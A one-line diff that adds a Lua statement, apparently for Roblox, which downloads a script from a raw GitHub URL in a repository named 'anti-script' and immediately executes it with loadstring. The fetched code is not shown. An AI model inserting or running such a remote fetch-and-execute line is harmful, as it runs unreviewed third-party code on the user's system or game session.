@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mct70/anti-script/refs/heads/main/starting.lua"))()
